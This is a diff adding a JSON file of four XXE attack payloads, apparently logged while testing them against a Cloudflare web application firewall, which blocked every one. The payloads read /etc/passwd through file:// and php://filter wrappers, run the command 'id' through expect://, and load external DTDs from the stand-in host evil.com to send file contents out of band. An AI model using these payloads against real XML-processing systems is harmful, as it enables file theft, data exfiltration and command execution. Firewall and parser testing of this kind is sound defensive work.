@@ -1,0 +1,63 @@
+{
+  "category": "xxe",
+  "subcategory": "advanced",
+  "count": 4,
+  "payloads": [
+    {
+      "id": "xxe-1001",
+      "category": "xxe",
+      "subcategory": "advanced",
+      "payload": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\">\n%xxe;\n%param1;\n]>\n<foo>&exfil;</foo>",
+      "description": "XXE parameter entity exfiltration",
+      "technique": "advanced",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xxe-1002",
+      "category": "xxe",
+      "subcategory": "advanced",
+      "payload": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n]>\n<foo>&xxe;</foo>",
+      "description": "XXE PHP wrapper",
+      "technique": "advanced",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xxe-1003",
+      "category": "xxe",
+      "subcategory": "advanced",
+      "payload": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"expect://id\">\n]>\n<foo>&xxe;</foo>",
+      "description": "XXE expect wrapper",
+      "technique": "advanced",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xxe-1004",
+      "category": "xxe",
+      "subcategory": "advanced",
+      "payload": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % dtd SYSTEM \"http://evil.com/evil.dtd\">\n%dtd;\n]>\n<foo>&send;</foo>",
+      "description": "Blind XXE OOB",
+      "technique": "advanced",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    }
+  ]
+}
